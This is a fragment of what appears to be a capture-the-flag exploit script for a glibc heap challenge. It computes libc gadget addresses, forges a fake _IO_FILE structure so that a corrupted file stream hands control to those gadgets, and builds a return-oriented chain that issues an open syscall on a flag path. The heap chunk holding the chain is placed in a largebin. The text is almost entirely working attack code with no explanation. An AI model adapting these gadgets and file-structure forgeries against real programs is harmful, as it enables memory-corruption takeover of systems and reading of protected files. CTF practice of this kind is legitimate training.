...
rdxr12=0x000000000011f497+libcbase
gadget1=0x00000000001675b8+libcbase #: call qword ptr [rdx + 0x20]
gadget2=0x000000000005a170+libcbase #: mov rsp, rdx ; ret
...
fake_IO_FILE +=p64(heapbase+0x1350)#_IO_backup_base=rdx #0x48
fake_IO_FILE +=p64(gadget1)#_IO_save_end=call addr(call setcontext/system) #0x50
...
flagoffset=0x100
payload=b'' #gadget&fakesp
payload+=p64(rdi)+p64(0)+p64(rdxr12)+p64(gadget2)*2 #gadget
payload+=p64(rdi)+p64(0)+p64(close) #40
payload+=p64(rdi)+p64(0x2)+p64(rsi)+p64(heapbase+0x1350+flagoffset)+p64(rdxr12)+p64(0)*2+p64(syscall)  #68+0x18 #open
...
add(6,0x430,payload) #send chunk4 to largebin #heapbase+0x1350
